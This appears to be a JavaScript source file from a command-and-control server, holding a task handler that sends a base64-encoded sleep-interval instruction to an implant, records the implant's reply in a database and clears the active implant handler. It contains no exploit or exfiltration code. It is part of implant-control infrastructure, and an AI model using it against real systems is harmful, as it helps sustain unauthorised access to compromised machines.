// Sleep Config Task Handler
export class TaskHandler {
  constructor(task) {
    this.task = task
  }
  getTask = async function (req, res) {
    let interval = JSON.parse(this.task.parameters).interval
    let payload = `SLEEP:${interval}`
    let instruction = `${this.task.id}:${Buffer.from(payload).toString('base64')}`
    let display = `Sleep Config: ${interval}ms`
    db.prepare(`UPDATE tasks SET display = $display WHERE id = $task_id`)
      .run({ task_id: this.task.id, display: display })
    this.task.display = display
    res.send(instruction)
  }
  taskIO = async function (req, res) {
    this.task.output = Buffer.from(req.body, 'base64').toString('utf8')
    this.task.completed_at = Date.now()
    db.prepare(`UPDATE tasks SET (output, completed_at) = ($output, $completed_at) WHERE id = $task_id`)
      .run({ task_id: this.task.id, output: this.task.output, completed_at: this.task.completed_at })
    res.type('text/plain').send('success')
    io('task_complete', this.task)
    delete active_implant_handlers[this.task.id]
  }
}
